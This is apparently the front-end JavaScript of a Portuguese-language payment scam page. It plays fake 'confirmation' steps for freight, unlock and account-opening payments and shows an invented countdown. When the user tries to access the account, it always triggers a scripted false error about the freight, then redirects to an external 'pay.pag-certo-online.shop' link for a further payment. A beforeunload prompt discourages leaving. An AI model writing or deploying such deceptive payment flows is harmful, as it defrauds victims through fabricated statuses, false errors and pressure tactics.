// Loading sequence controller
document.addEventListener('DOMContentLoaded', function() {
    startLoadingSequence();
});

function startLoadingSequence() {
    // Step 1: Pagamento do Frete
    setTimeout(() => {
        processStep(1, 'Confirmando pagamento...', 2000);
    }, 1000);
    
    // Step 2: Pagamento do Desbloqueio
    setTimeout(() => {
        processStep(2, 'Validando desbloqueio...', 2500);
    }, 4000);
    
    // Step 3: Abertura de Conta
    setTimeout(() => {
        processStep(3, 'Processando abertura...', 2000);
    }, 7500);
    
    // Show delivery info
    setTimeout(() => {
        showDeliveryInfo();
    }, 10500);
    
    // Show success screen
    setTimeout(() => {
        showSuccessScreen();
    }, 13000);
}

function processStep(stepNumber, processingText, duration) {
    const step = document.getElementById(`step${stepNumber}`);
    const status = document.getElementById(`status${stepNumber}`);
    const loader = document.getElementById(`loader${stepNumber}`);
    
    // Activate step
    step.classList.add('active');
    status.textContent = processingText;
    loader.style.display = 'block';
    
    // Complete step after duration
    setTimeout(() => {
        step.classList.remove('active');
        step.classList.add('completed');
        status.textContent = 'Confirmado ✓';
        loader.style.display = 'none';
        
        // Add success sound effect
        playSuccessSound();
    }, duration);
}

function showDeliveryInfo() {
    const deliveryInfo = document.getElementById('deliveryInfo');
    deliveryInfo.style.display = 'flex';
    
    // Start countdown
    startCountdown();
}

function startCountdown() {
    const countdownElement = document.getElementById('countdown');
    let hours = 22;
    let minutes = 59;
    let seconds = 45;
    
    const countdownInterval = setInterval(() => {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            
            if (minutes < 0) {
                minutes = 59;
                hours--;
                
                if (hours < 0) {
                    clearInterval(countdownInterval);
                    return;
                }
            }
        }
        
        const formattedTime = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        countdownElement.textContent = formattedTime;
    }, 1000);
}

function playSuccessSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
        
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.1, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
    } catch (e) {
        console.log('Audio not supported');
    }
}

function showSuccessScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const successScreen = document.getElementById('successScreen');
    
    // Fade out loading screen
    loadingScreen.style.transition = 'opacity 0.5s ease';
    loadingScreen.style.opacity = '0';
    
    setTimeout(() => {
        loadingScreen.style.display = 'none';
        successScreen.style.display = 'block';
        
        // Fade in success screen
        successScreen.style.opacity = '0';
        successScreen.style.transition = 'opacity 0.5s ease';
        
        setTimeout(() => {
            successScreen.style.opacity = '1';
        }, 50);
        
        // Add entrance animation to content
        const content = document.querySelector('.success-content');
        content.style.transform = 'translateY(30px)';
        content.style.opacity = '0';
        content.style.transition = 'all 0.6s ease';
        
        setTimeout(() => {
            content.style.transform = 'translateY(0)';
            content.style.opacity = '1';
        }, 200);
        
    }, 500);
}

function checkAccount() {
    const btn = event.target;
    const originalText = btn.innerHTML;
    
    // Show loading state
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ACESSANDO...';
    btn.disabled = true;
    btn.style.opacity = '0.8';
    
    // Show processing notification
    showNotification('Verificando conta...', 'info');
    
    // Simulate checking and then show error
    setTimeout(() => {
        showNotification('Erro detectado na análise do frete!', 'error');
        
        setTimeout(() => {
            showErrorScreen();
        }, 2000);
    }, 3000);
}

function showErrorScreen() {
    const successScreen = document.getElementById('successScreen');
    const errorScreen = document.getElementById('errorScreen');
    
    // Fade out success screen
    successScreen.style.transition = 'opacity 0.5s ease';
    successScreen.style.opacity = '0';
    
    setTimeout(() => {
        successScreen.style.display = 'none';
        errorScreen.style.display = 'block';
        
        // Fade in error screen
        errorScreen.style.opacity = '0';
        errorScreen.style.transition = 'opacity 0.5s ease';
        
        setTimeout(() => {
            errorScreen.style.opacity = '1';
        }, 50);
        
        // Add entrance animation to content
        const content = document.querySelector('.error-content');
        content.style.transform = 'translateY(30px)';
        content.style.opacity = '0';
        content.style.transition = 'all 0.6s ease';
        
        setTimeout(() => {
            content.style.transform = 'translateY(0)';
            content.style.opacity = '1';
        }, 200);
        
        // Play error sound
        playErrorSound();
        
    }, 500);
}

function playErrorSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(400, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(300, audioContext.currentTime + 0.2);
        
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.15, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.4);
    } catch (e) {
        console.log('Audio not supported');
    }
}

function redirectToFreightPayment() {
    const btn = event.target;
    const originalText = btn.innerHTML;
    
    // Show loading state
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSANDO...';
    btn.disabled = true;
    btn.style.opacity = '0.8';
    
    // Show processing notification
    showNotification('Redirecionando para pagamento do frete...', 'info');
    
    // Redirect after delay
    setTimeout(() => {
        window.location.href = 'https://pay.pag-certo-online.shop/kYL6geRp1Na3rKM';
    }, 2000);
}

function showNotification(message, type = 'info') {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    
    let bgColor = '#2196f3';
    let icon = 'fa-info-circle';
    
    if (type === 'error') {
        bgColor = '#f44336';
        icon = 'fa-exclamation-triangle';
    } else if (type === 'success') {
        bgColor = '#4caf50';
        icon = 'fa-check-circle';
    }
    
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas ${icon}"></i>
            <span>${message}</span>
        </div>
    `;
    
    // Add notification styles
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, ${bgColor} 0%, ${bgColor}dd 100%);
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        z-index: 10001;
        animation: slideInRight 0.3s ease;
        max-width: 300px;
        font-size: 14px;
        font-weight: 500;
    `;
    
    // Add to page
    document.body.appendChild(notification);
    
    // Remove after delay
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 4000);
}

// Add CSS animations for notifications
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
    
    .notification-content {
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    /* Responsive styles */
    @media (max-width: 768px) {
        .loading-container {
            padding: 20px;
        }
        
        .success-container, .error-container {
            margin: 10px;
        }
        
        .success-content, .error-content {
            padding: 30px 20px;
        }
        
        .delivery-status {
            flex-direction: column;
            text-align: center;
        }
        
        .error-alert {
            flex-direction: column;
            text-align: center;
        }
        
        .correction-box {
            padding: 20px;
        }
        
        .correction-item {
            flex-direction: column;
            gap: 5px;
            text-align: center;
        }
    }
`;
document.head.appendChild(style);

// Add touch feedback for mobile
document.addEventListener('touchstart', function(e) {
    if (e.target.classList.contains('continue-btn') || e.target.classList.contains('freight-payment-btn')) {
        e.target.style.transform = 'scale(0.98)';
    }
});

document.addEventListener('touchend', function(e) {
    if (e.target.classList.contains('continue-btn') || e.target.classList.contains('freight-payment-btn')) {
        setTimeout(() => {
            e.target.style.transform = '';
        }, 100);
    }
});

// Prevent accidental navigation during loading
window.addEventListener('beforeunload', function(e) {
    const loadingScreen = document.getElementById('loadingScreen');
    const successScreen = document.getElementById('successScreen');
    
    if (loadingScreen.style.display !== 'none' || successScreen.style.display !== 'none') {
        e.preventDefault();
        e.returnValue = '';
        return 'Tem certeza que deseja sair? O processo está em andamento.';
    }
});

